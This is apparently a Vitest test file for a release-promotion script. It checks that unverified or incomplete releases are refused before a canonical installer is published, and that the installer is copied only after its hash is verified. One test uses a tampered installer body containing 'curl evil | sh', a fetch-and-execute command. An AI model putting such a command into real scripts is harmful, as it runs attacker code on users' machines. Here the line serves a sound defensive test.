import { createHash } from 'node:crypto';
import { mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import {
  buildReleaseManifest,
  renderChecksums,
  serializeManifest,
} from '../../scripts/release/build-manifest.mjs';
import {
  promoteStable,
  verifyPublishedReleaseForPromotion,
} from '../../scripts/release/promote-stable.mjs';
import {
  CANONICAL_INSTALLER_KEY,
  POINTER_CACHE_CONTROL,
  STABLE_CHANNEL_KEY,
  releaseObjectKey,
} from '../../scripts/release/r2-publication-plan.mjs';

/**
 * T15.1 — the PROMOTE phase, exercised against a fake in-memory object store rather than real R2.
 * Every credential-shaped value here is fabricated; nothing in this file can reach the network.
 *
 * The behaviours that matter and are pinned here: an incomplete or inconsistent published release is
 * never promotable, the canonical installer is copied byte-for-byte from the published release (never
 * regenerated) and only after its SHA-256 is verified against the published manifest, the installer is
 * written BEFORE the stable pointer, both pointer writes are no-cache, and a rerun changes nothing.
 */

const VERSION = '0.1.1';
const BASE = 'https://downloads.example.test';
const WINDOWS = `ChantivoSetup-${VERSION}.exe`;
const LINUX = `chantivo-dedicated-server-${VERSION}-linux-x64.tar.gz`;
const INSTALLER = 'install-chantivo.sh';
const INSTALLER_BYTES = '#!/usr/bin/env bash\n# canonical published installer\nexit 0\n';

const sha256 = (text) => createHash('sha256').update(Buffer.from(text, 'utf8')).digest('hex');
const fakeHash = (seed) => seed.repeat(64).slice(0, 64);

/** A minimal, deterministic stand-in for the R2 object store: the same three-method surface
 * `createR2Client` exposes, backed by a Map. */
function createFakeBucket(initialObjects = {}) {
  const objects = new Map(Object.entries(initialObjects));
  const writes = [];
  return {
    objects,
    writes,
    async headObject(key) {
      const object = objects.get(key);
      if (!object) return { exists: false };
      return { exists: true, sha256: object.sha256, size: object.body.length };
    },
    async putObject({ key, bodyPath, cacheControl, contentType, sha256: hash }) {
      const { readFile } = await import('node:fs/promises');
      const body = await readFile(bodyPath, 'utf8');
      objects.set(key, { body, sha256: hash, cacheControl, contentType });
      writes.push({ key, cacheControl, contentType, sha256: hash });
    },
    async getObject({ key, destinationPath }) {
      const object = objects.get(key);
      if (!object) return false;
      await writeFile(destinationPath, object.body, 'utf8');
      return true;
    },
  };
}

// Stand-in artifact bodies. Their real lengths are what the fixture manifest declares, so the
// size-consistency check under test is exercised honestly rather than being fed numbers that happen
// to agree with nothing.
const WINDOWS_BYTES = 'MZ fake windows installer payload';
const LINUX_BYTES = 'fake dedicated server tarball payload';

function publishedRelease({ overrides = {}, omit = [] } = {}) {
  const files = [
    { filename: WINDOWS, sha256: fakeHash('a1'), size: WINDOWS_BYTES.length },
    { filename: LINUX, sha256: fakeHash('b2'), size: LINUX_BYTES.length },
    { filename: INSTALLER, sha256: sha256(INSTALLER_BYTES), size: INSTALLER_BYTES.length },
  ];
  const manifest = buildReleaseManifest({ version: VERSION, files });
  const manifestText = overrides.manifestText ?? serializeManifest(manifest);
  const checksumsText =
    overrides.checksumsText ??
    renderChecksums(files.map(({ filename, sha256: hash }) => ({ filename, sha256: hash })));

  const objects = {
    [releaseObjectKey(VERSION, WINDOWS)]: { body: WINDOWS_BYTES, sha256: fakeHash('a1') },
    [releaseObjectKey(VERSION, LINUX)]: { body: LINUX_BYTES, sha256: fakeHash('b2') },
    [releaseObjectKey(VERSION, INSTALLER)]: {
      body: overrides.installerBytes ?? INSTALLER_BYTES,
      sha256: sha256(overrides.installerBytes ?? INSTALLER_BYTES),
    },
    [releaseObjectKey(VERSION, 'SHA256SUMS')]: {
      body: checksumsText,
      sha256: sha256(checksumsText),
    },
    [releaseObjectKey(VERSION, 'release-manifest.json')]: {
      body: manifestText,
      sha256: sha256(manifestText),
    },
  };
  const omittedKeys = new Set(omit.map((filename) => releaseObjectKey(VERSION, filename)));
  return Object.fromEntries(Object.entries(objects).filter(([key]) => !omittedKeys.has(key)));
}

describe('promote-stable', () => {
  let workDir;

  beforeEach(async () => {
    workDir = await mkdtemp(path.join(tmpdir(), 'chantivo-promote-test-'));
  });

  afterEach(async () => {
    await rm(workDir, { recursive: true, force: true });
  });

  it('accepts a complete, self-consistent published release', async () => {
    const client = createFakeBucket(publishedRelease());
    const { manifest, installerSha256 } = await verifyPublishedReleaseForPromotion({
      client,
      version: VERSION,
      workDir,
    });
    expect(manifest.version).toBe(VERSION);
    expect(installerSha256).toBe(sha256(INSTALLER_BYTES));
  });

  it('refuses a release whose completeness marker was never written', async () => {
    const client = createFakeBucket(publishedRelease({ omit: ['release-manifest.json'] }));
    await expect(
      promoteStable({ client, version: VERSION, publicBaseUrl: BASE, workDir }),
    ).rejects.toThrow(/publication did not complete/u);
    expect(client.writes).toHaveLength(0);
  });

  it('refuses a release with no SHA256SUMS', async () => {
    const client = createFakeBucket(publishedRelease({ omit: ['SHA256SUMS'] }));
    await expect(
      promoteStable({ client, version: VERSION, publicBaseUrl: BASE, workDir }),
    ).rejects.toThrow(/unverifiable and must never be promoted/u);
    expect(client.writes).toHaveLength(0);
  });

  it('refuses a release whose declared Windows artifact object is missing', async () => {
    const client = createFakeBucket(publishedRelease({ omit: [WINDOWS] }));
    await expect(
      promoteStable({ client, version: VERSION, publicBaseUrl: BASE, workDir }),
    ).rejects.toThrow(/incomplete publication and cannot be promoted/u);
    expect(client.writes).toHaveLength(0);
  });

  it('refuses a release whose stored artifact checksum contradicts its manifest', async () => {
    const objects = publishedRelease();
    objects[releaseObjectKey(VERSION, LINUX)].sha256 = fakeHash('ff');
    const client = createFakeBucket(objects);
    await expect(
      promoteStable({ client, version: VERSION, publicBaseUrl: BASE, workDir }),
    ).rejects.toThrow(/internally inconsistent release/u);
    expect(client.writes).toHaveLength(0);
  });

  it('refuses to copy an installer whose bytes do not match the published manifest', async () => {
    // The single most dangerous inconsistency: the bytes about to be copied to the canonical location
    // every new operator downloads are not the bytes the release attests to.
    const objects = publishedRelease();
    objects[releaseObjectKey(VERSION, INSTALLER)] = {
      body: '#!/usr/bin/env bash\ncurl evil | sh\n',
      sha256: sha256('#!/usr/bin/env bash\ncurl evil | sh\n'),
    };
    const client = createFakeBucket(objects);
    await expect(
      promoteStable({ client, version: VERSION, publicBaseUrl: BASE, workDir }),
    ).rejects.toThrow(/Refusing to copy unverified bytes/u);
    expect(client.writes).toHaveLength(0);
  });

  it('refuses to promote a version that was never published at all', async () => {
    const client = createFakeBucket({});
    await expect(
      promoteStable({ client, version: '9.9.9', publicBaseUrl: BASE, workDir }),
    ).rejects.toThrow(/never published/u);
    expect(client.writes).toHaveLength(0);
  });

  it.each(['v0.1.1', 'latest', '0.1'])(
    'refuses a non-SemVer promotion target %s',
    async (version) => {
      const client = createFakeBucket(publishedRelease());
      await expect(
        promoteStable({ client, version, publicBaseUrl: BASE, workDir }),
      ).rejects.toThrow(/not a plain MAJOR\.MINOR\.PATCH/u);
      expect(client.writes).toHaveLength(0);
    },
  );

  it('writes the canonical installer before the stable pointer, both no-cache', async () => {
    const client = createFakeBucket(publishedRelease());
    const result = await promoteStable({ client, version: VERSION, publicBaseUrl: BASE, workDir });

    expect(client.writes.map((write) => write.key)).toEqual([
      CANONICAL_INSTALLER_KEY,
      STABLE_CHANNEL_KEY,
    ]);
    for (const write of client.writes) {
      expect(write.cacheControl).toBe(POINTER_CACHE_CONTROL);
      expect(write.cacheControl).not.toMatch(/immutable/u);
    }
    expect(result.channel.releaseBaseUrl).toBe(`${BASE}/releases/${VERSION}`);
  });

  it('copies the published installer byte-for-byte, never regenerating it', async () => {
    const client = createFakeBucket(publishedRelease());
    await promoteStable({ client, version: VERSION, publicBaseUrl: BASE, workDir });
    const written = client.objects.get(CANONICAL_INSTALLER_KEY);
    expect(written.body).toBe(INSTALLER_BYTES);
    expect(written.sha256).toBe(sha256(INSTALLER_BYTES));
    expect(written.sha256).toBe(client.objects.get(releaseObjectKey(VERSION, INSTALLER)).sha256);
  });

  it('is idempotent on a rerun', async () => {
    const client = createFakeBucket(publishedRelease());
    const first = await promoteStable({ client, version: VERSION, publicBaseUrl: BASE, workDir });
    expect(first.installerWritten).toBe(true);
    expect(first.channelWritten).toBe(true);

    const before = client.writes.length;
    const second = await promoteStable({ client, version: VERSION, publicBaseUrl: BASE, workDir });
    expect(second.installerWritten).toBe(false);
    expect(second.channelWritten).toBe(false);
    expect(client.writes).toHaveLength(before);
  });

  it('never touches the immutable release objects', async () => {
    const client = createFakeBucket(publishedRelease());
    await promoteStable({ client, version: VERSION, publicBaseUrl: BASE, workDir });
    for (const write of client.writes) {
      expect(write.key.startsWith('releases/')).toBe(false);
    }
  });

  it('rejects a public base URL pointing at a Chantivo-operated deployment', async () => {
    const client = createFakeBucket(publishedRelease());
    await expect(
      promoteStable({
        client,
        version: VERSION,
        publicBaseUrl: 'https://beta.chantivo.app',
        workDir,
      }),
    ).rejects.toThrow(/not the release distribution point/u);
    expect(client.writes).toHaveLength(0);
  });
});
